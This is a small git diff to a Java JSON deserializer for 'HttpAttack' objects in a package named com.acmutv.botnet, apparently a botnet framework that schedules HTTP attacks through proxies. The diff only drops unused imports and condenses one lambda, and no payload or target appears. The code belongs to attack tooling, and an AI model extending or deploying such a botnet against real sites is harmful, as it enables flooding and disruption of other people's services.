@@ -26,23 +26,17 @@
 
 package com.acmutv.botnet.core.attack.serial;
 
-import com.acmutv.botnet.config.AppConfiguration;
-import com.acmutv.botnet.config.serial.AppConfigurationSerializer;
 import com.acmutv.botnet.core.attack.HttpAttack;
-import com.acmutv.botnet.core.control.Controller;
 import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.net.HttpProxy;
-import com.acmutv.botnet.tool.string.TemplateEngine;
 import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonParser;
 import com.fasterxml.jackson.databind.DeserializationContext;
 import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.deser.std.StdDeserializer;
-import org.quartz.CronExpression;
 
 import java.io.IOException;
 import java.net.URL;
-import java.text.ParseException;
 import java.util.*;
 
 /**
@@ -98,9 +92,7 @@ public class HttpAttackDeserializer extends StdDeserializer<HttpAttack> {
 
     if (node.hasNonNull("properties")) {
       Map<String,String> properties = new HashMap<>();
-      node.get("properties").fields().forEachRemaining(f -> {
-        properties.put(f.getKey(), f.getValue().asText());
-      });
+      node.get("properties").fields().forEachRemaining(f -> properties.put(f.getKey(), f.getValue().asText()));
       attack.setProperties(properties);
     }
 
